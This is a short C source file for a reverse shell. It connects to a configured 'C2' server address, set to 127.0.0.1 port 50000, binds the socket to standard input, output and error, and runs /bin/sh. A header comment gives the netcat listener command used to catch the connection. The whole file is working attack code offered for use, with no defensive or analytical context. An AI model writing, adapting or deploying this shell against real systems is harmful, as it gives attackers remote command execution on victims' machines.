// -- useful command --
// > ip addr
// > nc -lvvnp 50000

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <unistd.h>

#define C2_IP "127.0.0.1"
#define C2_Port 50000

#if defined(_WIN32)
#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#define CLOSESOCKET(s) closesocket(s)
#define GETSOCKETERRNO() (WSAGetLastError())
#else
#define ISVALIDSOCKET(s) ((s) >= 0)
#define CLOSESOCKET(s) close(s)
#define SOCKET int
#define GETSOCKETERRNO() (errno)
#endif

int main() {
  int sock;
  struct sockaddr_in server;

  // create socket
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (!ISVALIDSOCKET(sock)) {
    fprintf(stderr, "[e] socket() error: %d\n", GETSOCKETERRNO());
    return 1;
  }

  // configure c2 server address
  server.sin_family = AF_INET;
  server.sin_port = htons(C2_Port);
  server.sin_addr.s_addr = inet_addr(C2_IP);

  // connect to c2 server
  if (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {
    fprintf(stderr, "[e] connect() error: %d\n", GETSOCKETERRNO());
    return 1;
  }

  // duplicate file descriptors
  dup2(sock, 0); // stdin
  dup2(sock, 1); // stdout
  dup2(sock, 2); // stderr

  // execute shell
  execve("/bin/sh", NULL, NULL);
  
  return 0;
}
